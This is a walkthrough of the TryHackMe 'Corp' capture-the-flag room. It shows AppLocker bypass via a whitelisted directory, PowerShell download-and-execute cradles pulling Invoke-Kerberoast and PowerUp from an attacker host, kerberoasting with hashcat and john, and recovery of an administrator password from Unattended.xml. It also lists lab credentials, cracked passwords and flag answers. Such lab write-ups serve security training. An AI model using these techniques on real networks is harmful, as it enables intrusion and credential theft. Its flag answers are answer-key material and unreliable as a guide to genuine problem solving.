# [Corp](https://tryhackme.com/r/room/corp)

![Corp](./images/Corp.png)

Bypass Windows Applocker and escalate your privileges. You will learn about kerberoasting, evading AV, bypassing applocker and escalating your privileges on a Windows system.

## Task 1 - Deploy the Windows machine

In this room, you will learn the following:

1. Windows Forensics
2. Basics of kerberoasting
3. AV Evading
4. Applocker

Please note that this machine does not respond to ping (ICMP) and may take a few minutes to boot up.

### Answer the questions below

Deploy the windows machine, you will be able to control this in your browser. However if you prefer to use your own RDP client, the credentials are below.

Username: `corp\dark`  
Password: `_QuejVudId6`

![task1-IP](./images/task1-IP.png)

```
xfreerdp /u:dark /p:_QuejVudId6 /d:corp /v:$IP +clipboard /cert-ignore
```

![task1-rdp](./images/task1-rdp.png)

## Task 2 - Bypassing Applocker

![task2-logo](./images/task2-logo.png)

AppLocker is an application whitelisting technology introduced with Windows 7. It allows restricting which programs users can execute based on the programs path, publisher, and hash.

You will have noticed that with the deployed machine, you cannot execute your binaries, and certain functions on the system will be restricted.

### Answer the questions below

There are many ways to bypass AppLocker.

If AppLocker is configured with default AppLocker rules, we can bypass it by placing our executable in the following directory: `C:\Windows\System32\spool\drivers\color` - This is whitelisted by default. 

* Go ahead and use PowerShell to download an executable of your choice locally, place it in the whitelisted directory and execute it.

	* Create C program `hello.c` to print word `Hello World..!!!` and compile to file name `hello.exe`
	
		```
		#include<stdio.h>

		int main() {
  		printf("Hello World..!!!");
  		return 0;
		}
		```

		![task2-hello1](./images/task2-hello1.png)

		```
		x86_64-w64-mingw32-gcc hello.c -o hello.exe
		```

		![task2-hello2](./images/task2-hello2.png)

	* Create simple HTTP server on our machine, transfer file `hello.exe` to Host target in the whitelisted directory and execute it
	
		![task2-http](./images/task2-http.png)

		```
		Invoke-WebRequest -Uri 'http://10.17.127.223:8000/hello.exe' -OutFile 'C:\Windows\System32\spool\drivers\color\hello.exe'
		```

		![task2-hello3](./images/task2-hello3.png)

Just like Linux bash, Windows Powershell saves all previous commands into a file called **ConsoleHost_history**. This is located at `%userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt`

* Access the file and obtain the flag.
	
	`flag{a12a41b5f8111327690f836e9b302f0b}`

	![task2-flag](./images/task2-flag.png)

## Task 3 - Kerberoasting

<img src="./images/task3-logo.png" height=300  width=auto>

It is important you understand how Kerberous actually works in order to know how to exploit it. Watch the video below.

[![Watch the video](./images/task3-thumbnail.jpg)](https://www.youtube.com/watch?v=LmbP-XD1SC8)

Kerberos is the authentication system for Windows and Active Directory networks. There are many attacks against Kerberos, in this room we will use a Powershell script to request a service ticket for an account and acquire a ticket hash. We can then crack this hash to get access to another user account!

### Answer the questions below

Lets first enumerate Windows. If we run `setspn -T medin -Q */*` we can extract all accounts in the SPN.

SPN is the Service Principal Name, and is the mapping between service and account.

* Running that command, we find an existing SPN. What user is that for?

	`fela`

	![task3-SPN](./images/task3-SPN.png)

Now we have seen there is an SPN for a user, we can use Invoke-Kerberoast and get a ticket.

Lets first download the Powershell [Invoke-Kerberoast](https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1).

```
powershell -ep bypass;
iex(New-Object Net.WebClient).DownloadString('https://YOUR_IP/Kerberoast.ps1') 
```

Now lets load this into memory: `Invoke-Kerberoast -OutputFormat hashcat |fl`

You should get a SPN ticket.

<img src="./images/task3-hascat.png" height=400  width=auto>

![task3-kerberoast](./images/task3-kerberoast.png)	

Lets use hashcat to bruteforce this password. The type of hash we're cracking is **Kerberos 5 TGS-REP etype 23** and the hashcat code for this is **13100**.

```
hashcat -m 13100 -a 0 hash.txt wordlist --force
```

* Crack the hash. What is the users password in plain text?

	`rubenF124`

	* Create `hast.txt`
	
		![task3-hash](./images/task3-hash.png)

	* Crack the hash
	
		```
		john --format=krb5tgs -w=/usr/share/wordlists/rockyou.txt hash.txt
		```

		![task3-john](./images/task3-john.png)

* Login as this user. What is his flag?

	`flag{bde1642535aa396d2439d86fe54a36e4}`

	```
	xfreerdp /v:$IP /d:corp /u:fela /p:rubenF124 +clipboard
	```

	![task3-flag](./images/task3-flag.png)

## Task 4 - Privilege Escalation

<img src="./images/task4-logo.png" height=100  width=auto>

We will use a PowerShell enumeration script to examine the Windows machine. We can then determine the best way to get Administrator access.

### Answer the questions below

We will run [PowerUp1.ps1](https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1) into memory for enumerating any weakness to abuse for local privilege escalation.

```
powershell -ep bypass;
iex(New-Object Net.WebClient).DownloadString('http://YOUR_IP/PowerUp.ps1') 
```

![task4-powerup](./images/task4-powerup.png)

The script has identified several ways to get Administrator access. The first being to bypassUAC and the second is UnattendedPath. We will be exploiting the UnattendPath way.

"Unattended Setup is the method by which original equipment manufacturers (OEMs), corporations, and other users install Windows NT in unattended mode." Read more about it [here](https://support.microsoft.com/en-us/topic/77504e1d-2b75-5be1-3eef-cec3617cc461).

It is also where users passwords are stored in base64 encoding. Navigate to `C:\Windows\Panther\Unattend\Unattended.xml`.

![task4-xml](./images/task4-xml.png)

* What is the decoded password?

	`tqjJpEX9Qv8ybKI3yHcc=L!5e(!wW;$T`

	![task4-unattended](./images/task4-unattended.png)

	```
	echo "dHFqSnBFWDlRdjh5YktJM3lIY2M9TCE1ZSghd1c7JFQ=" | base64 -d
	```

	![task4-password](./images/task4-password.png)

* Now we have the Administrator's password, login as them and obtain the last flag

	`THM{g00d_j0b_SYS4DM1n_M4s73R}`

	```
	xfreerdp /v:$IP /d:corp /u:Administrator /p:'tqjJpEX9Qv8ybKI3yHcc=L!5e(!wW;$T' +clipboard
	```

	![task4-flag](./images/task4-flag.png)